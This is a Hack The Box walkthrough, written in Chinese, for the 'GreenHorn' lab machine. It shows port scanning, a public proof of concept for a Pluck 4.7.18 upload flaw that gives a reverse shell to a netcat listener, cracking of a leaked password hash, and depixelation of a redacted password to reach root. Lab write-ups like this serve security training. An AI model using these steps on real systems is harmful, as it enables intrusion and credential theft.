###### tags: `Hack the box` `HTB` `Easy` `Linux`

# GreenHorn

```
┌──(kali㉿kali)-[~/htb]
└─$ rustscan -a 10.129.229.249 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 10.129.229.249:22
Open 10.129.229.249:80
Open 10.129.229.249:3000

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 57:d6:92:8a:72:44:84:17:29:eb:5c:c9:63:6a:fe:fd (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOp+cK9ugCW282Gw6Rqe+Yz+5fOGcZzYi8cmlGmFdFAjI1347tnkKumDGK1qJnJ1hj68bmzOONz/x1CMeZjnKMw=
|   256 40:ea:17:b1:b6:c5:3f:42:56:67:4a:3c:ee:75:23:2f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEZQbCc8u6r2CVboxEesTZTMmZnMuEidK9zNjkD2RGEv
80/tcp   open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://greenhorn.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST
3000/tcp open  ppp?    syn-ack                                                 
```

先把`greenhorn.htb`加到`/etc/hosts`
```
┌──(kali㉿kali)-[~/htb]
└─$ sudo nano /etc/hosts

10.129.229.249  greenhorn.htb
```

前往`http://greenhorn.htb/`可以點下面的`admin`發現有`pluck 4.7.18`，google找到[CVE-2023-50564](https://github.com/Rai2en/CVE-2023-50564_Pluck-v4.7.18_PoC)，要用他要先把`poc.py`裡面的`hostname`改成`greenhorn.htb`

```
login_url = "http://greenhorn.htb/login.php"
upload_url = "http://greenhorn.htb/admin.php?action=installmodule"

rce_url="http://greenhorn.htb/data/modules/payload/shell.php"
```

在shell.php裡面修改ip跟port，把他包成zip之後用他，先開nc
```
┌──(kali㉿kali)-[~/htb]
└─$ rlwrap -cAr nc -nvlp4444

┌──(kali㉿kali)-[~/htb/CVE-2023-50564_Pluck-v4.7.18_PoC]
└─$ python3 poc.py                                                                                                                          
ZIP file path: /home/kali/htb/CVE-2023-50564_Pluck-v4.7.18_PoC/shell.zip
Login account
ZIP file download.

python3 -c 'import pty; pty.spawn("/bin/bash")'
```

可以進行RCE之後沒有權限，所以我們再來`http://greenhorn.htb:3000/`看看，註冊帳號之後可以進到`GreenAdmin/GreenHorn`的project，之後找到路徑`GreenHorn/data/settings/pass.php`有密碼
```php
<?php
$ww = 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163';
?>
```

利用[crackstation](https://crackstation.net/)
```
Hash	                                                             Type	Result
d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d7704
86743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163	sha512	iloveyou1
```

剛剛RCE那邊可以利用`iloveyou1`切成`junior`的帳號，在`/home/junior`的路徑可得到`user.txt`
```
www-data@greenhorn:/$ su junior
su junior
Password: iloveyou1

junior@greenhorn:~$ cat user.txt
cat user.txt
7df3a39b9c2c6abd32b198e883c444af
```

在同個路徑下有一個`'Using OpenVAS.pdf'`，開http server把它下載回來

```
junior@greenhorn:~$ ls
 user.txt  'Using OpenVAS.pdf'
 
junior@greenhorn:~$ python3 -m http.server 8000

┌──(kali㉿kali)-[~/htb]
└─$ wget 10.129.229.249:8000/'Using OpenVAS.pdf'
```

點開發現裡面有一坨像素的東東蓋住，先把pdf轉成png，用[Depix](https://github.com/spipm/Depix)

![GreenHorn_1.png](picture/GreenHorn_1.png)

```
┌──(kali㉿kali)-[~/htb/Depix]
└─$ pdfimages -png "Using OpenVAS.pdf" pass.png

┌──(kali㉿kali)-[~/htb/Depix]
└─$ python3 depix.py -p pass.png-000.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o out.png 
```

轉出來長這樣好醜

![GreenHorn_2.png](picture/GreenHorn_2.png)

```
sidefromsidetheothersidesidefromsidetheotherside
```

切成root權限到root得root.txt
```
junior@greenhorn:/var/www/html/pluck/data/modules/payload$ su root
su root
Password: sidefromsidetheothersidesidefromsidetheotherside

root@greenhorn:/var/www/html/pluck/data/modules/payload# cd /root
cd /root
root@greenhorn:~# cat root.txt
cat root.txt
60f9c77f5d63f978f03a7da7f64609f9
```
